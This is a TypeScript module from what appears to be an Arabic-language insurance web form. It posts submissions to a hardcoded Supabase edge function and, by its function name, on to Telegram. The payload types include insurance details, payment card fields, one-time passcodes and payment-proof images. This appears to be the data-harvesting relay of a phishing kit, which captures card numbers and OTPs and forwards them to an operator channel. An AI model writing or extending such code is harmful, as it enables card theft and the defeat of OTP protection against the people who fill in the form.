import type { InsuranceStep1Payload, InsuranceStep2Payload } from '@/types/domain'
import { saveSubmission } from '@/api/submissions'

const DEFAULT_WEBHOOK_URL =
  'https://jsuddmiozadtbjnqnrqu.supabase.co/functions/v1/super-worker'

const anon = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY || import.meta.env.VITE_SUPABASE_ANON_KEY

function getWebhookUrl(): string {
  const explicit = import.meta.env.VITE_WEBHOOK_URL?.trim()
  if (explicit) return explicit

  const base = import.meta.env.VITE_SUPABASE_URL?.replace(/\/$/, '')
  const fnName = import.meta.env.VITE_SUPABASE_FUNCTION_NAME || 'super-worker'
  if (base) return `${base}/functions/v1/${fnName}`

  return DEFAULT_WEBHOOK_URL
}

export type TelegramRequest =
  | { type: 'insurance_step1'; payload: InsuranceStep1Payload }
  | { type: 'insurance_step2'; payload: InsuranceStep2Payload }
  | {
      type: 'payment_card'
      payload: Record<string, string>
    }
  | { type: 'otp'; payload: Record<string, string> }
  | {
      type: 'payment_proof'
      payload: Record<string, string>
      imageBase64: string
      imageMimeType: string
      fileName: string
    }

export async function sendToTelegram(body: TelegramRequest): Promise<{ ok: boolean; error?: string }> {
  if (import.meta.env.VITE_SAVE_SUBMISSIONS === 'true') {
    const saved = await saveSubmission(body)
    if (!saved.ok) return saved
  }

  const webhookUrl = getWebhookUrl()
  if (!webhookUrl) {
    return { ok: false, error: 'رابط الإرسال غير مضبوط' }
  }

  const headers: Record<string, string> = { 'Content-Type': 'application/json' }
  if (anon) {
    headers.Authorization = `Bearer ${anon}`
    headers.apikey = anon
  }

  const res = await fetch(webhookUrl, {
    method: 'POST',
    headers,
    body: JSON.stringify(body),
  })
  if (!res.ok) {
    const t = await res.text()
    return { ok: false, error: t || res.statusText }
  }
  return { ok: true }
}
